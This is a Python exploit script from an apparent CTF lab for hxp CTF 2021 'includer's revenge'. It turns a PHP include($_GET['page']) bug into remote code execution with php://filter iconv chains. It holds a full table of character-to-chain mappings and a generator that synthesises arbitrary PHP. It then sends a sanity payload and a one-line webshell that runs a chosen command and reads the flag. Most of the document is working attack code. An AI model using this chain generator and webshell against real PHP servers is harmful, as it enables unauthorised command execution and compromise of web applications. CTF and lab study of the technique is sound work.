#!/usr/bin/env python3
"""
12 - Filter Chain RCE  (hxp CTF 2021 "includer's revenge", loknop's solution)

    <?php include($_GET['page']);

No writable file exists anywhere on the target, so every classic LFI-to-RCE
trick (log poisoning, /tmp/phpXXXXXX upload temporaries, session files,
/proc/self/fd) is dead.  The content is synthesised by the stream filter
chain itself:

  * convert.base64-decode is sloppy.  Bytes outside the base64 alphabet are
    silently skipped and the rest is consumed four characters at a time.
  * a handful of iconv target charsets are stateful and emit a fixed escape
    sequence before the first converted character.  convert.iconv.UTF8.CSISO2022KR
    for instance prepends "\x1b$)C" - of which only the 'C' is a base64
    character.

So `convert.iconv.UTF8.CSISO2022KR | convert.base64-decode` decodes "C" plus
whatever base64 text follows, and `convert.base64-encode` turns the result
back into base64 text that now starts with the letter we injected.  Longer
iconv chains mangle that escape sequence into other single base64 characters,
which gives a full alphabet.  Repeat once per character, in reverse, and the
head of the stream becomes base64 of anything you like; one last
convert.base64-decode turns it into the bytes PHP will execute.

Python 3 standard library only.
"""
import argparse
import base64
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

FLAG_RE = re.compile(rb"PHRACK\{[^}]*\}")

# ---------------------------------------------------------------------------
# One iconv chain per base64 character.  Finding these is a brute-force job
# over the ~1200 charset names glibc ships; the table below is the community
# result - wupco's PHP_INCLUDE_TO_SHELL_CHAR_DICT, extended by loknop and
# tidied up by Remsio/Synacktiv - and every entry was re-checked against the
# exact image this lab pins (php:8.2.33-apache, glibc 2.41) with the probe
# described in WRITEUP.md.  Credits in WRITEUP.md; the generator below is
# written from scratch.
# ---------------------------------------------------------------------------
PREPEND = {
    '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
    '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
    '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
    '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
    '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
    '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
    '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
    '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
    '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
    'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
    'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
    'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
    'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
    'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
    'H': 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
    'I': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
    'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
    'K': 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
    'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
    'M': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
    'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
    'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
    'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
    'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
    'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
    'S': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
    'T': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
    'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
    'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
    'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
    'X': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
    'Y': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
    'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
    'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
    'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
    'c': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
    'd': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
    'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
    'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
    'g': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
    'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
    'i': 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
    'j': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
    'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
    'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
    'm': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
    'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
    'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
    'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
    'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
    'r': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
    's': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
    't': 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
    'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
    'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
    'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
    'x': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
    'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
    'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
    '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157',
    '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
}

# After every injection the stream is re-encoded, which re-introduces '='
# padding at the end.  convert.base64-decode treats '=' as end-of-stream and
# throws the rest away, so the padding has to go: UTF-7 escapes '=' as
# "+AD0-", and '-' is not a base64 character, so the '=' simply disappears.
STRIP_PADDING = "convert.iconv.UTF8.UTF7"


def b64_alphabet_only(data: bytes) -> str:
    """base64 of `data` without '=' padding - the chain cannot carry padding."""
    return base64.b64encode(data).decode().rstrip("=")


def build_chain(payload: bytes, resource: str = "php://temp",
                debug: bool = False) -> str:
    """Return a php://filter URL whose output starts with `payload`.

    The stream is kept as *base64 text* the whole way through.  One pass of
    the loop prepends exactly one base64 character to that text:

        <iconv chain>          garbage + our character are pushed in front
        convert.base64-decode  the garbage is skipped, our character is not
        convert.base64-encode  back to base64 text, one character longer
        convert.iconv.UTF8.UTF7   kill the '=' padding that re-encoding added

    Walking the wanted base64 string backwards therefore builds it forwards.
    """
    wanted = b64_alphabet_only(payload)
    missing = sorted({c for c in wanted if c not in PREPEND})
    if missing:
        raise ValueError("no iconv chain known for %r" % missing)

    # Seed: make sure the stream is pure base64 text before we start, whatever
    # the resource contained.  The leading iconv is only there to guarantee
    # the stream is non-empty (an empty stream has nothing to prepend to).
    steps = ["convert.iconv.UTF8.CSISO2022KR",
             "convert.base64-encode",
             STRIP_PADDING]

    for char in reversed(wanted):
        steps.append(PREPEND[char])
        steps.append("convert.base64-decode")
        steps.append("convert.base64-encode")
        steps.append(STRIP_PADDING)

    if not debug:                    # final decode turns the text into bytes
        steps.append("convert.base64-decode")

    return "php://filter/" + "|".join(steps) + "/resource=" + resource


# ---------------------------------------------------------------------------
def get(base: str, params: dict, timeout: int = 30) -> bytes:
    url = base.rstrip("/") + "/?" + urllib.parse.urlencode(params)
    req = urllib.request.Request(url, headers={"User-Agent": "phrack72"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.read()
    except urllib.error.HTTPError as exc:
        return b"HTTP " + str(exc.code).encode() + b"\n" + exc.read()
    except Exception as exc:                           # noqa: BLE001
        print(f"[-] request failed: {exc}")
        return b""


def body_after_rule(page: bytes) -> bytes:
    """The template prints everything before <hr>; we only want the include."""
    idx = page.rfind(b"<hr>")
    return page[idx + 4:] if idx >= 0 else page


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("target", nargs="?", default="http://challenge")
    ap.add_argument("-c", "--command", default="/readflag")
    args = ap.parse_args()
    base = args.target

    print(f"[*] target   {base}")

    # ---- stage 1: prove the chain can synthesise arbitrary PHP ------------
    canary = build_chain(b"<?=1337*3;?>")
    print(f"[*] stage 1  sanity chain, {len(canary)} bytes, "
          f"{canary.count('|') + 1} filters")
    out = body_after_rule(get(base, {"page": canary}))
    if b"4011" not in out:
        print(f"[-] sanity chain did not execute: {out[:300]!r}")
        return 1
    print("[+] stage 1  the chain executed PHP that exists in no file")

    # ---- stage 2: a one-shot webshell, then run the command --------------
    shell = b"<?=`$_GET[0]`;;?>"
    chain = build_chain(shell)
    print(f"[*] stage 2  webshell chain, {len(chain)} bytes, "
          f"{chain.count('|') + 1} filters")
    out = body_after_rule(get(base, {"page": chain, "0": args.command}))

    match = FLAG_RE.search(out)
    if not match:
        print(f"[-] no flag; output was {out[:400]!r}")
        return 1
    print(f"[+] `{args.command}` ran as the web user")
    print("FLAG: " + match.group(0).decode())
    return 0


if __name__ == "__main__":
    sys.exit(main())
